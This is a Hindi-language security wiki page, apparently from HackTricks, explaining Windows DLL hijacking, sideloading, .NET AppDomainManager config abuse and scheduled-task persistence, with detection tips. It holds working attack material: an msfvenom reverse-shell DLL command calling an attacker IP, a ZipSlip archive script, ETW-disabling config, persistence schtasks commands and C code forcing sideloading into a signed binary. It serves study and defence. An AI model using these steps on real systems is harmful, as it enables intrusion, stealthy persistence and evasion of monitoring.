# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## बुनियादी जानकारी

DLL Hijacking में किसी विश्वसनीय application से malicious DLL लोड करवाने के लिए उसमें हेरफेर किया जाता है। इस शब्द में **DLL Spoofing, Injection, और Side-Loading** जैसी कई रणनीतियाँ शामिल हैं। इसका मुख्य उपयोग code execution और persistence हासिल करने के लिए, और कम मामलों में privilege escalation के लिए किया जाता है। यहाँ escalation पर ध्यान होने के बावजूद, hijacking का तरीका सभी उद्देश्यों में एक जैसा रहता है।

### आम तकनीकें

DLL hijacking के लिए कई तरीकों का इस्तेमाल किया जाता है। उनकी प्रभावशीलता application की DLL loading strategy पर निर्भर करती है:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: असली DLL को malicious DLL से बदलना; मूल DLL की functionality बनाए रखने के लिए वैकल्पिक रूप से DLL Proxying का इस्तेमाल किया जा सकता है।
2. **DLL Search Order Hijacking**: malicious DLL को search path में legitimate DLL से पहले रखना और application के search pattern का फायदा उठाना।
3. **Phantom DLL Hijacking**: application के लिए malicious DLL बनाना, ताकि वह उसे ऐसी आवश्यक DLL समझकर लोड करे जो वास्तव में मौजूद नहीं है।
4. **DLL Redirection**: application को malicious DLL की ओर निर्देशित करने के लिए `%PATH%` या `.exe.manifest` / `.exe.local` files जैसे search parameters में बदलाव करना।
5. **WinSxS DLL Replacement**: WinSxS directory में legitimate DLL को उसके malicious counterpart से बदलना। यह तरीका अक्सर DLL side-loading से जुड़ा होता है।
6. **Relative Path DLL Hijacking**: malicious DLL को copied application के साथ, user-controlled directory में रखना। यह Binary Proxy Execution तकनीकों जैसा है।

Application अपना **खुद का DLL loader** भी लागू कर सकती है। एक privileged process, सामान्य Windows DLL search order से स्वतंत्र रूप से, `Libraries` या `Plugins` जैसी child directory को enumerate करके चुनी गई DLL को किसी helper को दे सकता है। अगर कोई दूसरा account उस सटीक directory में files बना सकता है, तो इसे जाँच-पड़ताल के संकेत के रूप में लें: process identity, directory के effective ACL, file-selection rule और उपलब्ध load operation की पुष्टि करें। Executable के पास मौजूद writable directory से यह साबित नहीं होता कि process वहाँ से DLL लोड करता है।

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}

### Installation के बाद PE import grafting

Classic side-loading में trusted PE को अपरिवर्तित रखा जाता है और DLL name resolution का फायदा उठाया जाता है। इसके बजाय **Import grafting**, उस PE को संशोधित करता है जिसे trusted program पहले से लोड कर चुका है। Attacker, attacker-controlled DLL के लिए एक import descriptor और उससे जुड़ी lookup/IAT entries जोड़ता है। जब Windows उस dependency को recursively resolve करता है, तो वह जोड़ी गई DLL को map करता है और अन्यथा legitimate process के भीतर उसका initialization code चलाता है। यह disk पर किया गया PE modification है; यह runtime hook से live IAT function pointer बदलने जैसी प्रक्रिया नहीं है।<sup>[[31]](#references)[[32]](#references)</sup>

संशोधित PE, user या Task Scheduler द्वारा लॉन्च किए गए executable के बजाय कोई intermediate vendor DLL हो सकती है। दोबारा इस्तेमाल की जा सकने वाली chain इस प्रकार है:<sup>[[32]](#references)</sup>

1. Legitimate executable और उसकी dependencies को attacker-controlled directory में copy करें।
2. एक dependency के import structures को patch करें, ताकि वे malicious DLL को reference करें, और साथ ही dependency के अपेक्षित exports और सामान्य व्यवहार को बनाए रखें।
3. Legitimate executable शुरू करने के लिए autorun या scheduled task configure करें। Loader, बदली हुई dependency और फिर नई import की गई DLL को map करता है। Task enumeration के लिए [Privilege Escalation with Autoruns](../privilege-escalation-with-autorun-binaries.md#scheduled-tasks) देखें।
4. `DllMain` में अधिक समय लेने वाला काम न करें; देखे गए loader ने एक worker thread बनाया और वहीं staged decryption जारी रखी।

यह vendor-side supply-chain compromise से अलग है, क्योंकि vendor package साफ़ होता है और import modification installation के बाद किया जाता है। Staged directory के हर module की जाँच करें, सिर्फ host EXE की नहीं: dependency import lists और hashes की known-good installation से तुलना करें, signatures verify करें और `C:\ProgramData` जैसी अप्रत्याशित writable locations से लॉन्च की गई vendor binaries की जाँच करें। ऐसी directory में copied crash reporter या updater की ओर संकेत करने वाला scheduled task, आगे की जाँच के लिए विशेष रूप से उपयोगी संकेत है।<sup>[[32]](#references)</sup>


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Trusted **.NET Framework** process से attacker code लोड करवाने का एकमात्र तरीका classic DLL sideloading नहीं है। अगर target executable एक **managed** application है, तो CLR, executable के नाम पर बनी **application configuration file** को भी देखता है (उदाहरण के लिए `Setup.exe.config`)। इस file में custom **AppDomainManager** परिभाषित किया जा सकता है। यदि config, EXE के पास रखी attacker-controlled assembly की ओर संकेत करता है, तो CLR उसे **application के सामान्य code path से पहले** लोड करता है और वह trusted process के भीतर चलती है।<sup>[[24]](#references)</sup>

Microsoft के .NET Framework configuration schema के अनुसार, custom manager के इस्तेमाल के लिए `<appDomainManagerAssembly>` और `<appDomainManagerType>` दोनों मौजूद होने चाहिए।<sup>[[16]](#references)[[17]](#references)</sup>

न्यूनतम config:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

न्यूनतम प्रबंधक:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

व्यावहारिक नोट्स:
- यह **केवल .NET Framework के लिए** tradecraft है। यह Win32 DLL search order के बजाय CLR config parsing पर निर्भर करता है।
- होस्ट वास्तव में **managed EXE** होना चाहिए। त्वरित जाँच: `sigcheck -m target.exe`, `corflags target.exe`, या PE metadata में **CLR Runtime Header** देखें।
- Config filename का executable के नाम से हूबहू मेल खाना चाहिए (`<binary>.config`) और यह आमतौर पर **EXE के बगल में** होता है।
- यह **signed Microsoft/vendor binaries** के साथ उपयोगी है, क्योंकि trusted EXE को बिना बदले रखते हुए malicious managed assembly in-process execute होती है।
- यदि आपके पास पहले से writable installer/update directory है, तो AppDomainManager hijacking को **पहले चरण** के रूप में इस्तेमाल किया जा सकता है, जिसके बाद अगले चरणों के लिए classic DLL sideloading या reflective loading किया जा सकता है।

### AppDomainManager को downloader + scheduled-task bootstrap के रूप में इस्तेमाल करना

एक व्यावहारिक intrusion pattern में trusted managed EXE को एक malicious `*.config` और एक malicious AppDomainManager DLL—दोनों के साथ जोड़ा जाता है, जो केवल **छोटे bootstrapper** के रूप में काम करता है:<sup>[[25]](#references)</sup>

1. उपयोगकर्ता किसी विश्वसनीय लगने वाली जगह, जैसे `%USERPROFILE%\Downloads`, से signed .NET installer या updater launch करता है।
2. साथ में मौजूद config, CLR को legitimate app logic शुरू होने **से पहले** attacker assembly load करने के लिए कहता है।
3. Malicious manager **path gate** लागू करता है (उदाहरण के लिए, आगे तभी बढ़ना जब host EXE `Downloads` से चल रहा हो, और second stage को केवल `%LOCALAPPDATA%` से चलने देना)।
4. जाँच सफल होने पर, यह असली payload को `%LOCALAPPDATA%\PerfWatson2.exe` जैसे user-writable path पर download करता है और scheduled task के ज़रिए persistence स्थापित करता है।

यह variant क्यों मायने रखता है:
- Signed host EXE अपरिवर्तित रहता है, इसलिए केवल main binary को hash करने वाली triage इस compromise को पहचान नहीं सकती।
- सरल **path-based anti-analysis** आम है: ZIP/EXE/DLL triad को Desktop, Temp या sandbox path पर ले जाने से जानबूझकर chain टूट सकती है।
- पहले चरण की AppDomainManager DLL छोटी और low-noise रह सकती है, जबकि असली implant बाद में fetch किया जाता है।

इस pattern के साथ अक्सर देखा जाने वाला न्यूनतम persistence उदाहरण:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

नोट्स:
- `/rl highest` का मतलब उस user/session के लिए **उपलब्ध सबसे ऊँचा स्तर** है; यह अपने-आप में SYSTEM तक escalation की गारंटी नहीं देता।
- इस technique को classic missing-DLL search-order hijacking के बजाय अक्सर **.NET config abuse के ज़रिए execution/persistence** के रूप में वर्गीकृत करना बेहतर होता है, हालाँकि operators अक्सर दोनों को chain करते हैं।

Detection pivots:
- Signed .NET executables, जिन्हें **ZIP extraction paths**, `Downloads`, `%TEMP%` या user-writable अन्य folders से **साथ रखी गई** `<exe>.config` file के साथ launch किया जाता है।
- नए scheduled tasks, जिनकी action `%LOCALAPPDATA%`, `%APPDATA%` या `Downloads` के अंदर मौजूद किसी path की ओर इशारा करती है और जिनके नाम browser/vendor updaters जैसे लगते हैं।
- थोड़े समय चलने वाली managed bootstrap processes, जो तुरंत एक और EXE download करती हैं और फिर `schtasks.exe` spawn करती हैं।
- ऐसे samples, जो तब तक जल्दी exit हो जाते हैं जब तक executable path किसी अपेक्षित user-profile directory से मेल न खाए।

### sideload chain को फिर से launch करने के लिए किसी मौजूदा scheduled task को hijack करना

Persistence के लिए, केवल **नया task बनाने** पर ध्यान न दें। कुछ intrusion sets तब तक इंतज़ार करते हैं जब तक कोई legitimate installer एक **सामान्य updater task** न बना दे; फिर वे **task action को rewrite** करते हैं, ताकि मौजूदा नाम, author और trigger defenders को परिचित लगें।

दोबारा इस्तेमाल किया जा सकने वाला workflow:
1. Legitimate software install/run करें और उस task की पहचान करें जिसे वह सामान्यतः बनाता है।
2. Task XML export करें और मौजूदा `<Exec><Command>` / `<Arguments>` values नोट करें।<sup>[[23]](#references)</sup>
3. केवल action को बदलें, ताकि task किसी user-writable staging directory से आपका **trusted host EXE** शुरू करे; फिर यह EXE असली payload को side-load या AppDomain-load करे।
4. कोई नया, आसानी से पहचाना जाने वाला persistence artifact बनाने के बजाय, उसी task name को फिर से register करें।

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

यह अधिक stealthy क्यों है:
- Task का नाम अब भी वैध लग सकता है (उदाहरण के लिए, किसी vendor का updater)।
- **Task Scheduler service** इसे launch करती है, इसलिए parent/ancestor validation में अक्सर `explorer.exe` के बजाय अपेक्षित scheduling chain दिखती है।
- जो DFIR teams केवल **नए task names** खोजती हैं, वे ऐसा task चूक सकती हैं जिसका registration पहले से मौजूद था, लेकिन जिसका action अब `%LOCALAPPDATA%`, `%APPDATA%` या attacker के नियंत्रण वाले किसी अन्य path की ओर इंगित करता है।

जल्दी जाँचने के तरीके:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- `C:\Windows\System32\Tasks\*` XML और `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` metadata की तुलना baseline से करें।
- जब कोई **vendor-जैसा दिखने वाला updater task** **user-writable directories** से execute हो या साथ में मौजूद `*.config` file के साथ .NET EXE launch करे, तो alert करें।

> [!TIP]
> HTML staging, AES-CTR configs और .NET implants को DLL sideloading के साथ जोड़ने वाली step-by-step chain के लिए नीचे दिया गया workflow देखें।

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

### side-loaded stage को service command line से बाँधना

एक side-loaded DLL को अपेक्षित host EXE और DLL name से अधिक की आवश्यकता हो सकती है। Mandiant ने ऐसे loader का वर्णन किया जो payload decryption को command-line argument और उसके host executable के name से बाँधता है।<sup>[[33]](#references)</sup> बाद में service-backed chain में, एक कॉपी किए गए वैध host ने पास की `mscoree.dll` load की, जिसने `LockClrVersion` export किया और service argument तथा host executable basename से AES-128 key निकालने के बाद ही अपना embedded stage decrypt किया। हर input को 16 bytes तक truncate किया गया या NUL से pad किया गया; bytewise key `argument XOR embedded_key XOR executable_basename` थी, फिर payload को बिना padding के AES-CBC से decrypt किया गया। Host का नाम बदलने या उसे अपेक्षित argument के बिना launch करने से key बदल जाती है और यह stage decrypt नहीं होता, भले ही DLL load हो जाए। इस variant को दोहराते या analyze करते समय exact command-line argument और basename बनाए रखें।<sup>[[34]](#references)</sup>

यह **सामान्य DLL side-loading के ऊपर जोड़ा गया payload gate** है, कोई नया DLL search-order rule या अपने-आप में privilege-escalation primitive नहीं। परिणामी privilege level service के security context से निर्धारित होता है। [GitHub issue/file C2 workflow](../../../generic-methodologies-and-resources/github-issues-and-repository-files-c2.md) बाद के transport को अलग से दर्ज करता है।<sup>[[34]](#references)</sup>

## Missing DLLs खोजना

किसी system में missing Dlls खोजने का सबसे आम तरीका sysinternals से [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) चलाना और **निम्नलिखित 2 filters सेट करना** है:

![Common Techniques - Missing Dlls खोजना: किसी system में missing Dlls खोजने का सबसे आम तरीका sysinternals से procmon चलाना और निम्नलिखित 2 filters सेट करना है](<../../../images/image (961).png>)

![Common Techniques - Missing Dlls खोजना: किसी system में missing Dlls खोजने का सबसे आम तरीका sysinternals से procmon चलाना और निम्नलिखित 2 filters सेट करना है](<../../../images/image (230).png>)

और केवल **File System Activity** दिखाएँ:

![Common Techniques - Missing Dlls खोजना: और केवल File System Activity दिखाएँ](<../../../images/image (153).png>)

अगर आप **सामान्य रूप से missing dlls** खोज रहे हैं, तो इसे कुछ **seconds** तक चलने दें।\
अगर आप किसी **specific executable के अंदर missing DLL** खोज रहे हैं, तो **"Process Name" "contains" `<exec name>`** जैसा एक और filter सेट करें, उसे execute करें और events capture करना रोक दें।<sup>[[9]](#references)</sup>

## Missing DLLs का शोषण

Privileges escalate करने के लिए ऐसी **DLL खोजें जिसे कोई privileged process ऐसी location से load करने की कोशिश करता है जहाँ आप लिख सकते हैं**। ऐसा तब हो सकता है जब आपके नियंत्रण वाला directory, वैध DLL वाले directory से पहले search होता हो, या अनुरोधित DLL मौजूद न हो और आप किसी searched directory में लिख सकते हों।

### Dll Search Order

**[**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **में आप विस्तार से देख सकते हैं कि Dlls कैसे load होते हैं।**

**Windows applications** DLLs को **पहले से तय search paths** के एक निश्चित क्रम में खोजती हैं। DLL hijacking की समस्या तब आती है जब किसी harmful DLL को इनमें से किसी directory में रणनीतिक रूप से रखा जाता है, जिससे वह authentic DLL से पहले load हो जाए। इससे बचने का एक तरीका यह सुनिश्चित करना है कि application आवश्यक DLLs का संदर्भ देते समय absolute paths का उपयोग करे।

नीचे **32-bit** systems का **DLL search order** दिया गया है:

1. वह directory जहाँ से application load हुई।
2. system directory। इस directory का path पाने के लिए [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function का उपयोग करें।(_C:\Windows\System32_)
3. 16-bit system directory। इस directory का path पाने के लिए कोई function नहीं है, लेकिन इसकी खोज की जाती है। (_C:\Windows\System_)
4. Windows directory। इस directory का path पाने के लिए [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function का उपयोग करें।
   1. (_C:\Windows_)
5. current directory।
6. PATH environment variable में सूचीबद्ध directories। ध्यान दें कि इसमें **App Paths** registry key से निर्दिष्ट per-application path शामिल नहीं होता। DLL search path की गणना करते समय **App Paths** key का उपयोग नहीं होता।

**SafeDllSearchMode** enabled होने पर यह **default** search order है। Disabled होने पर current directory दूसरे स्थान पर आ जाती है। इस feature को disable करने के लिए **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value बनाएँ और इसे 0 पर सेट करें (default रूप से enabled होता है)।

अगर [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function को **LOAD_WITH_ALTERED_SEARCH_PATH** के साथ call किया जाता है, तो search उस executable module की directory से शुरू होती है जिसे **LoadLibraryEx** load कर रहा है।

अंत में, DLL को name के बजाय absolute path से load किया जा सकता है। ऐसी स्थिति में, Windows DLL के लिए केवल उसी path को देखता है; name से माँगी गई dependencies पर लागू search order अब भी लागू होता है।

Search order बदलने के अन्य तरीके भी हैं, लेकिन मैं उन्हें यहाँ नहीं समझाऊँगा।

### Arbitrary file write को missing-DLL hijack में जोड़ना

**संबंधित technique:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. उन DLL names को इकट्ठा करने के लिए **ProcMon** filters (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) का उपयोग करें जिन्हें process खोजता है, लेकिन पा नहीं पाता।<sup>[[14]](#references)</sup>
2. अगर binary **schedule/service** पर चलती है, तो उन names में से किसी एक नाम की DLL को **application directory** (search-order entry #1) में रखने पर वह अगले execution में load होगी। .NET scanner के एक मामले में process, असली copy को `C:\Program Files\dotnet\fxr\...` से load करने से पहले `C:\samples\app\` में `hostfxr.dll` खोज रहा था।
3. किसी भी export के साथ payload DLL (जैसे reverse shell) बनाएँ: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`।
4. अगर आपका primitive **ZipSlip-style arbitrary write** है, तो ऐसा ZIP तैयार करें जिसकी entry extraction dir से बाहर निकलकर DLL को app folder में रख दे:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Archive को watched inbox/share में पहुँचाएँ; जब scheduled task process को दोबारा launch करेगा, तो वह malicious DLL load करेगा और service account के रूप में आपका code execute करेगा।

### RTL_USER_PROCESS_PARAMETERS.DllPath के ज़रिए sideloading को बाध्य करना

नए बनाए गए process के DLL search path को निश्चित रूप से प्रभावित करने का एक उन्नत तरीका यह है कि ntdll के native APIs से process बनाते समय RTL_USER_PROCESS_PARAMETERS में DllPath field सेट किया जाए। यहाँ attacker-controlled directory देने पर, ऐसा target process जो किसी imported DLL को नाम से resolve करता है (बिना absolute path के और safe loading flags का उपयोग किए बिना), उस directory से malicious DLL load करने के लिए बाध्य किया जा सकता है।

मुख्य विचार
- RtlCreateProcessParametersEx से process parameters बनाएँ और एक custom DllPath दें, जो आपके नियंत्रित folder (उदाहरण के लिए, वह directory जहाँ आपका dropper/unpacker मौजूद है) की ओर इंगित करता हो।
- RtlCreateUserProcess से process बनाएँ। जब target binary किसी DLL को नाम से resolve करेगी, तो loader resolution के दौरान दिए गए DllPath को देखेगा, जिससे malicious DLL target EXE के साथ उसी directory में न होने पर भी विश्वसनीय रूप से sideloading संभव होगी।

नोट/सीमाएँ
- इसका असर बनाए जा रहे child process पर पड़ता है; यह SetDllDirectory से अलग है, जो केवल current process को प्रभावित करता है।
- Target को किसी DLL को नाम से import करना या LoadLibrary करना चाहिए (बिना absolute path के और LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories का उपयोग किए बिना)।
- KnownDLLs और hardcoded absolute paths को hijack नहीं किया जा सकता। Forwarded exports और SxS precedence को बदल सकते हैं।

न्यूनतम C उदाहरण (ntdll, wide strings, सरलीकृत error handling):

<details>
<summary>पूरा C उदाहरण: RTL_USER_PROCESS_PARAMETERS.DllPath के ज़रिए DLL sideloading को बाध्य करना</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

व्यावहारिक उपयोग का उदाहरण
- अपनी DllPath directory में एक malicious xmllite.dll रखें (जो आवश्यक functions export करती हो या असली DLL को proxy करती हो)।
- ऊपर बताई गई technique का उपयोग करके ऐसा signed binary launch करें जिसके बारे में पता हो कि वह xmllite.dll को नाम से खोजता है। Loader, दिए गए DllPath के ज़रिए import resolve करता है और आपकी DLL को sideload करता है।

इस technique का उपयोग वास्तविक हमलों में multi-stage sideloading chains चलाने के लिए देखा गया है: शुरुआती launcher एक helper DLL drop करता है, जो फिर custom DllPath के साथ Microsoft-signed, hijackable binary spawn करता है, ताकि staging directory से attacker की DLL load हो सके।<sup>[[6]](#references)</sup>


### `.exe.config` के ज़रिए .NET AppDomainManager hijacking

**.NET Framework** targets के लिए, application's साथ वाली **`.exe.config`** file का दुरुपयोग करके memory patch किए बिना **`Main()` से पहले** sideloading की जा सकती है। केवल Win32 DLL search order पर निर्भर रहने के बजाय, attacker एक legitimate .NET EXE के साथ malicious config और एक या अधिक attacker-controlled assemblies रखता है।

यह chain इस तरह काम करती है:<sup>[[15]](#references)[[22]](#references)</sup>
1. Host EXE शुरू होता है और **CLR `<exe>.config` पढ़ता है**।
2. Config में **`<appDomainManagerAssembly>`** और **`<appDomainManagerType>`** सेट किए जाते हैं, ताकि runtime attacker-controlled `AppDomainManager` को instantiate करे।
3. Malicious manager को trusted host process के अंदर **`Main()` से पहले execution** मिलता है।
4. यही config CLR को पहले local assemblies resolve करने के लिए बाध्य कर सकता है (उदाहरण के लिए `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) और inline patching के बिना runtime validation/telemetry को कमज़ोर कर सकता है।

Campaign-जैसा pattern (निर्देश / CLR version के अनुसार nesting का सटीक रूप अलग हो सकता है):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

यह क्यों उपयोगी है:
- **`<probing privatePath="."/>`** assembly resolution को application directory तक सीमित रखता है, जिससे यह फ़ोल्डर एक अनुमानित sideloading surface बन जाता है।<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** CLR initialization के दौरान execution को attacker code में ले जाते हैं, इससे पहले कि legitimate app logic चले।<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** full-trust app को strong-name validation failure के बिना unsigned या tampered assemblies लोड करने दे सकता है।<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** publisher-policy redirects से newer assemblies की ओर जाने से बचाता है।<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** runtime selection को अधिक नियतात्मक बनाता है।<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** विशेष रूप से दिलचस्प है, क्योंकि इसमें implant द्वारा memory में `EtwEventWrite` patch करने के बजाय, configuration से **CLR अपनी ETW visibility को disable करता है**।

हाल के campaigns में दिखा operational pattern:
- Stage 1 में `setup.exe`, `setup.exe.config`, और local assemblies रखी जाती हैं।
- Stage 2 में इन्हें एक भरोसेमंद दिखने वाले **AppData update** फ़ोल्डर में copy किया जाता है, host का नाम `update.exe` जैसा रखा जाता है, और फिर **scheduled task** से दोबारा launch किया जाता है।
- Stage 3 में final RAT DLL/export लोड करने से पहले execution context की पुष्टि की जाती है (उदाहरण के लिए, Task Scheduler से अपेक्षित parent `svchost.exe`)।

Hunting के सुझाव:
- उपयोगकर्ता द्वारा लिखे जा सकने वाले स्थानों में संदिग्ध साथ की **`.config`** फ़ाइलों के साथ चलने वाले signed या अन्यथा legitimate **.NET executables**।
- ऐसी `.config` फ़ाइलें जिनमें **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`**, या **`etwEnable enabled="false"`** हों।
- ऐसे scheduled tasks जो **`%LOCALAPPDATA%`** या app-specific `\bin\update\` directories से renamed update binaries को दोबारा launch करते हों।
- ऐसी parent/child chains जिनमें scheduled task किसी trusted .NET host को launch करता हो और वह तुरंत अपनी directory से non-vendor assemblies लोड करे।

#### Windows docs में DLL search order के अपवाद

Windows documentation में standard DLL search order के कुछ अपवाद बताए गए हैं:

- जब **ऐसी DLL मिलती है जिसका नाम पहले से memory में loaded DLL के नाम से मेल खाता है**, तो system सामान्य search को छोड़ देता है। इसके बजाय, memory में पहले से मौजूद DLL को चुनने से पहले redirection और manifest की जाँच की जाती है। **इस स्थिति में, system DLL को खोजता नहीं है**।
- यदि DLL को वर्तमान Windows version के लिए **known DLL** के रूप में पहचाना जाता है, तो system खोज प्रक्रिया को **छोड़कर**, उस known DLL के अपने version और उसकी dependent DLLs का उपयोग करेगा। Registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** में इन known DLLs की सूची होती है।
- यदि किसी **DLL की dependencies** हैं, तो उनकी खोज ऐसे की जाती है मानो उन्हें केवल उनके **module names** से दर्शाया गया हो, भले ही शुरुआती DLL की पहचान full path के ज़रिए हुई हो।

### Privileges बढ़ाना

**आवश्यकताएँ**:

- ऐसे process की पहचान करें जो **अलग privileges** (horizontal या lateral movement) के तहत चलता हो या चलेगा, और जिसमें **DLL मौजूद न हो**।
- सुनिश्चित करें कि किसी भी ऐसी **directory** के लिए **write access** उपलब्ध हो जिसमें **DLL** खोजी जाएगी। यह executable की directory या system path की कोई directory हो सकती है।

ये पूर्वापेक्षाएँ आम तौर पर default रूप से नहीं मिलतीं: privileged executables में आम तौर पर DLL dependencies missing नहीं होतीं, और standard users सामान्यतः system search-path directories में लिख नहीं सकते। फिर भी, misconfigured environments में ये दोनों स्थितियाँ सामने आ सकती हैं।\
यदि आवश्यकताएँ पूरी होती हैं, तो [UACME](https://github.com/hfiref0x/UACME) project देखें। हालाँकि इसका मुख्य उद्देश्य UAC bypass है, इसमें कुछ Windows versions के लिए DLL-hijacking PoCs हैं, जिन्हें अक्सर आपके द्वारा खोजी गई writable directory के अनुसार ढाला जा सकता है।

ध्यान दें कि आप यह **जाँच सकते हैं कि किसी folder में आपकी permissions क्या हैं**:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

और **PATH के अंदर मौजूद सभी फ़ोल्डरों की permissions जांचें**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

आप executable के imports और dll के exports भी जांच सकते हैं:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

**System Path folder** में write permissions के साथ privileges escalate करने के लिए **DLL Hijacking का दुरुपयोग कैसे करें**, इसकी पूरी guide के लिए देखें:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

